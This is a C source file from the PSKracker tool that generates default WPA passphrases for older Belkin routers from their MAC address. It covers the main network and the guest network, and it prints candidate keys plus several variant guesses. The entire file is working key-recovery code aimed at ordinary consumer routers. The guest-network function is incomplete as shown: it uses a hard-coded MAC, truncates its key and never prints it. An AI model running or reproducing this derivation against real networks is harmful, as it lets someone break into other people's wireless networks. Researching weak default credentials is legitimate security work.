/*
 * PSKracker: WPA/WPA2/WPS default key/pin generator written in C.
 *
 * Copyright (c) 2017-2019, soxrok2212 <soxrok2212@gmail.com>
 * SPDX-License-Identifier: GPL-3.0+
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

/* Older algorithm used by some 802.11n models */

#define MAC_LEN	6
#define BELKIN_OLD_PSK_LENGTH 9

char WpaPreKeyBuf[BELKIN_OLD_PSK_LENGTH]="";
void genpassBelkinOld(uint8_t *mac) {
	uint16_t mac16[BSSID_LEN];
	unsigned char *pMac = mac;
	unsigned char buffer[7]="";
	int i, j;
	char key_map_1[9] = {0},key_map_2[9] = {0};
	
	for (i = 0; i < BSSID_LEN; i++) {
        	mac16[i] = mac[i];
	}
	memset(WpaPreKeyBuf,0,sizeof(WpaPreKeyBuf));
	memcpy(buffer, pMac, MAC_LEN);
	sprintf(key_map_1,"%02X%02X%02X%02X", buffer[2], buffer[3], buffer[4], buffer[5]+1);/*wan mac*/

	/* do key map 1,position map */
	key_map_2[0] = key_map_1[5];
	key_map_2[1] = key_map_1[1];
	key_map_2[2] = key_map_1[2];
	key_map_2[3] = key_map_1[7];
	key_map_2[4] = key_map_1[4];
	key_map_2[5] = key_map_1[5];
	key_map_2[6] = key_map_1[6];
	key_map_2[7] = key_map_1[3];

	/* do key map 2 */
	for(j=0;j<8;j++) {
		switch(key_map_2[j]) {
			case '0':
				key_map_2[j] = '0';
				break;
			case '1':
				key_map_2[j] = '2';
				break;
			case '2':
				key_map_2[j] = '4';
				break;
			case '3':
				key_map_2[j] = '6';
				break;
			case '4':
				key_map_2[j] = '1';
				break;
			case '5':
				key_map_2[j] = '3';
				break;
			case '6':
				key_map_2[j] = '5';
				break;
			case '7':
				key_map_2[j] = '7';
				break;
			case '8':
				key_map_2[j] = '8';
				break;
			case '9':
				key_map_2[j] = 'a';
				break;
			case 'A':
				key_map_2[j] = 'c';
				break;
			case 'B':
				key_map_2[j] = 'e';
				break;
			case 'C':
				key_map_2[j] = '9';
				break;
			case 'D':
				key_map_2[j] = 'b';
				break;
			case 'E':
				key_map_2[j] = 'd';
				break;
			case 'F':
				key_map_2[j] = 'f';
				break;
			default:
				break;
		}
	}

	/* do key map 3 */
	for(j=0;j<8;j++)
	{
		switch(key_map_2[j])
		{
			case '0':
				key_map_2[j] = '9';
				break;
			case '1':
				key_map_2[j] = '2';
				break;
			case '2':
				key_map_2[j] = '4';
				break;
			case '3':
				key_map_2[j] = '6';
				break;
			case '5':
				key_map_2[j] = '3';
				break;
			default:
				break;
		}
	}
	/* default key */
	memcpy(WpaPreKeyBuf, key_map_2, 8);
	printf("%s\n", WpaPreKeyBuf);

	/* make other guesses for modified algorithms */
	int k = 0x30;
	while (k < 0x3a) {
		key_map_2[5] = k;
		memcpy(WpaPreKeyBuf, key_map_2, 8);
		k++;
		printf("%s\n", WpaPreKeyBuf);
	}
	k = 0x61;
	while (k < 0x67) {
		key_map_2[5] = k;
		memcpy(WpaPreKeyBuf, key_map_2, 8);
		k++;
		printf("%s\n", WpaPreKeyBuf);
	}

}

/* Old guest network algorithm */

void genpassBelkinOldGuest() {
	unsigned char mac[6]={0x00,0xc0,0x02,0x12,0x35,0x88};
	unsigned char *pMac;
	unsigned char buffer[7]="";
	int i,j;
	char key_map_1[13] = {0},key_map_2[13] = {0};
	pMac = mac;
	memset(WpaPreKeyBuf,0,sizeof(WpaPreKeyBuf));
	memcpy(buffer, pMac, MAC_LEN);
	sprintf(key_map_1,"%02X%02X%02X%02X%02X%02X",buffer[0],buffer[1],buffer[2],buffer[3],buffer[4],buffer[5]);/*lan mac*/

	/* do key map 1,position map */
	key_map_2[0] = key_map_1[9];
	key_map_2[1] = key_map_1[5];
	key_map_2[2] = key_map_1[6];
	key_map_2[3] = key_map_1[11];
	key_map_2[4] = key_map_1[8];
	key_map_2[5] = key_map_1[4];
	key_map_2[6] = key_map_1[10];
	key_map_2[7] = key_map_1[7];
	key_map_2[8] = key_map_1[2];
	key_map_2[9] = key_map_1[3];

	/* do key map 2 */
	for(j=0;j<10;j++)
	{
		switch(key_map_2[j])
		{
			case '0':
				key_map_2[j] = '0';
				break;
			case '1':
				key_map_2[j] = '2';
				break;
			case '2':
				key_map_2[j] = '4';
				break;
			case '3':
				key_map_2[j] = '6';
				break;
			case '4':
				key_map_2[j] = '1';
				break;
			case '5':
				key_map_2[j] = '3';
				break;
			case '6':
				key_map_2[j] = '5';
				break;
			case '7':
				key_map_2[j] = '7';
				break;
			case '8':
				key_map_2[j] = '8';
				break;
			case '9':
				key_map_2[j] = 'a';
				break;
			case 'A':
				key_map_2[j] = 'c';
				break;
			case 'B':
				key_map_2[j] = 'e';
				break;
			case 'C':
				key_map_2[j] = '9';
				break;
			case 'D':
				key_map_2[j] = 'b';
				break;
			case 'E':
				key_map_2[j] = 'd';
				break;
			case 'F':
				key_map_2[j] = 'f';
				break;
			default:
				break;
		}
	}

	/* do key map 3 */
	for(j=0;j<10;j++)
	{
		switch(key_map_2[j])
		{
			case '0':
				key_map_2[j] = '9';
				break;
			case '1':
				key_map_2[j] = '2';
				break;
			case '2':
				key_map_2[j] = '4';
				break;
			case '3':
				key_map_2[j] = '6';
				break;
			case '5':
				key_map_2[j] = '3';
				break;
			default:
				break;
		}
	}
	memcpy(WpaPreKeyBuf, key_map_2, 8);
}
